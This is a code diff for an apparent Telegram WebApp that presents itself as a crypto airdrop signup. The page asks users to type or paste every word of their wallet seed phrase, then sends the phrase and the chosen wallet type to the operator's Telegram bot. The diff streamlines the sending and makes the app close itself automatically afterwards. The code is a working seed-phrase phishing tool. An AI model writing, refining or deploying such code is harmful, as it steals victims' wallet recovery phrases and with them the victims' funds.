@@ -23,6 +23,10 @@ document.addEventListener("DOMContentLoaded", () => {
             document.getElementById("airdropList").innerHTML =
                 "<p style='color:red'>❌ Не удалось загрузить список airdrop'ов.</p>";
         });
+
+    // Привʼязка до кнопки сабміту
+    const btn = document.getElementById('submitBtn');
+    if (btn) btn.addEventListener('click', submitAirdrop);
 });
 
 function selectAirdrop(name) {
@@ -36,6 +40,7 @@ function renderSeedInputs() {
     const length = parseInt(document.getElementById('length').value);
     const container = document.getElementById('seedContainer');
     container.innerHTML = '';
+
     for (let i = 0; i < length; i++) {
         const input = document.createElement('input');
         input.type = 'text';
@@ -43,7 +48,7 @@ function renderSeedInputs() {
         container.appendChild(input);
     }
 
-    // Додати слухач вставки на перше поле
+    // Обробка вставки seed-фрази одразу у всі поля
     const inputs = container.querySelectorAll('input');
     if (inputs.length > 0) {
         inputs[0].addEventListener('paste', (e) => {
@@ -66,9 +71,12 @@ function clearWarning() {
 }
 
 function submitAirdrop() {
-    const tg = Telegram.WebApp;
+    const tg = window.Telegram.WebApp;
+    tg.ready();
+
     const inputs = Array.from(document.querySelectorAll('#seedContainer input'));
     const words = inputs.map(input => input.value.trim()).filter(word => word !== '');
+
     if (words.length !== inputs.length) {
         const warning = document.getElementById('validationWarning');
         warning.innerText = 'Пожалуйста, заполните все поля.';
@@ -85,38 +93,33 @@ function submitAirdrop() {
         wallet: document.getElementById("wallet").value
     };
 
-    tg.sendData(JSON.stringify(payload));
-    tg.expand();
-
-    document.querySelector(".container").innerHTML = `
-        <h3 style="color:green;text-align:center">⏳ Подключение и участие…</h3>
-    `;
-
-    setTimeout(() => {
-        window.location.href = "airprofile.html";
-    }, 1500);
+    console.log("[📤 Отправка]", payload);
+    tg.sendData(JSON.stringify(payload));  // надсилання payload у Telegram бота
+    tg.close();  // автоматично закриває WebApp
 }
 
-// Логіка селектора гаманців
+// ======= Кастомний селектор гаманця =======
 const selectWrapper = document.querySelector('.custom-select');
-const selected = selectWrapper.querySelector('.selected');
-const options = selectWrapper.querySelectorAll('.options li');
-const hiddenInput = document.querySelector('#wallet');
+if (selectWrapper) {
+    const selected = selectWrapper.querySelector('.selected');
+    const options = selectWrapper.querySelectorAll('.options li');
+    const hiddenInput = document.querySelector('#wallet');
 
-selected.addEventListener('click', () => {
-    selectWrapper.classList.toggle('open');
-});
-
-options.forEach(option => {
-    option.addEventListener('click', () => {
-        selected.innerHTML = option.innerHTML;
-        hiddenInput.value = option.dataset.value;
-        selectWrapper.classList.remove('open');
+    selected.addEventListener('click', () => {
+        selectWrapper.classList.toggle('open');
     });
-});
 
-document.addEventListener('click', e => {
-    if (!selectWrapper.contains(e.target)) {
-        selectWrapper.classList.remove('open');
-    }
-});
+    options.forEach(option => {
+        option.addEventListener('click', () => {
+            selected.innerHTML = option.innerHTML;
+            hiddenInput.value = option.dataset.value;
+            selectWrapper.classList.remove('open');
+        });
+    });
+
+    document.addEventListener('click', e => {
+        if (!selectWrapper.contains(e.target)) {
+            selectWrapper.classList.remove('open');
+        }
+    });
+}
